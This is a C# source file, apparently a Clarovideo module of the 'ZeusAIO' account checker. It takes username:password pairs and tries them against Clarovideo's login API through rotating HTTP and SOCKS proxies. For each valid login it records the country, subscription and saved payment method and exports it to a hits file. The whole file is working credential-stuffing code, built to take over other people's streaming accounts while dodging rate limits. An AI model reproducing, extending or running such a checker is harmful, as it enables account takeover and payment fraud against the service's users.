using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Clarovideo
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            //---
                            httpRequest.AllowAutoRedirect = false;
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36";
                            string text2 = httpRequest.Get("https://mfwkweb-api.clarovideo.net/services/user/login?device_id=web&device_category=web&device_model=web&device_type=web&device_so=Chrome&format=json&device_manufacturer=generic&authpn=webclient&authpt=tfg1h3j4k6fd7&api_version=v5.91&region=ecuador&HKS=6ncnsjb9n2iq9qa9ae6itg0fe6&username=" + s[0] + "&password=" + s[1] + "&includpaywayprofile=true").ToString();
                            if (text2.Contains("\":\"N\""))
                            {
                                //Bad
                                break;
                            }
                            else if (text2.Contains("\":\"OK\"}"))
                            {
                                string pm = "";
                                string country = Check.Parse(text2, "\",\"country_code\":\"" ,"\",\"");
                                string Language = Check.Parse(text2, ",\"language\":\"", "\",\"status\":\"success\",\"");
                                string Subscriptions = Check.Parse(text2, "\"],\"subscriptions\":{\"", "\":");
                                string PaymentMethod = Check.Parse(text2, "\":\"CV_MENSUAL\",\"key\":\"" , "_Subscription");
                                if (PaymentMethod.Contains("hasSavedPayway\":0,\"hasUserSusc\":0,\""))
                                {
                                    pm = "False";
                                }
                                else
                                {
                                    pm = PaymentMethod;
                                }
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - CLAROVIDEO] " + s[0] + ":" + s[1] + " | Country: " + country + " | Language: " + Language + " | Subscription: " + Subscriptions + " | Payment Method: " + pm, Color.Green);
                                }
                                Export.AsResult("/Clarovideo_hits", s[0] + ":" + s[1] + " | Country: " + country + " | Language: " + Language + " | Subscription: " + Subscriptions + " | Payment Method: " + pm);
                                return false;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.errors++;
                                goto Retry;
                            }
                        }
                        //break;
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

